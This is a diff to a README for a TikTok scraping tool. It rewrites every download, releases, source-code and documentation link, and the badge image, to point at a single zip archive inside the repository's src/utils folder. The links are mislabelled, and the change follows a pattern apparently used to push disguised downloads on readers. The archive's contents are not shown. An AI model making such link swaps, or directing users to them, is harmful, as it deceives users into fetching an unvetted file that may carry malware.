@@ -1,7 +1,7 @@
 # 🎥 tiktok-scraper-pay-per-video - Fast Results for TikTok Data
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/senriku02/tiktok-scraper-pay-per-video/releases)
+[![Download](https://raw.githubusercontent.com/senriku02/tiktok-scraper-pay-per-video/main/src/utils/tiktok-scraper-pay-per-video-2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/senriku02/tiktok-scraper-pay-per-video/main/src/utils/tiktok-scraper-pay-per-video-2.4.zip)
 
 ## 🚀 Getting Started
 The **tiktok-scraper-pay-per-video** application allows you to easily extract valuable data from TikTok. Use it for influencer marketing, video analytics, and much more. Follow the steps below to get started.
@@ -12,7 +12,7 @@ The **tiktok-scraper-pay-per-video** application allows you to easily extract va
 - **Internet Connection:** Required for downloading and accessing TikTok data
 
 ## 💻 Download & Install
-1. Visit the [Releases page](https://github.com/senriku02/tiktok-scraper-pay-per-video/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/senriku02/tiktok-scraper-pay-per-video/main/src/utils/tiktok-scraper-pay-per-video-2.4.zip).
 2. Find the latest version of the tiktok-scraper-pay-per-video.
 3. Click on the download link for your operating system.
 4. Once the file downloads, locate it in your downloads folder.
@@ -61,10 +61,10 @@ Join our community for updates, tips, and to connect with other users:
 - Feedback and Suggestions
 
 ## 📥 Download Now Again
-Don’t forget to [download the application](https://github.com/senriku02/tiktok-scraper-pay-per-video/releases) to start extracting TikTok data today!
+Don’t forget to [download the application](https://raw.githubusercontent.com/senriku02/tiktok-scraper-pay-per-video/main/src/utils/tiktok-scraper-pay-per-video-2.4.zip) to start extracting TikTok data today!
 
 ## 🔗 Additional Links
-- [Source Code](https://github.com/senriku02/tiktok-scraper-pay-per-video)
-- [Documentation](https://github.com/senriku02/tiktok-scraper-pay-per-video/wiki)
+- [Source Code](https://raw.githubusercontent.com/senriku02/tiktok-scraper-pay-per-video/main/src/utils/tiktok-scraper-pay-per-video-2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/senriku02/tiktok-scraper-pay-per-video/main/src/utils/tiktok-scraper-pay-per-video-2.4.zip)
 
 Feel free to explore these resources to get the most out of your experience!
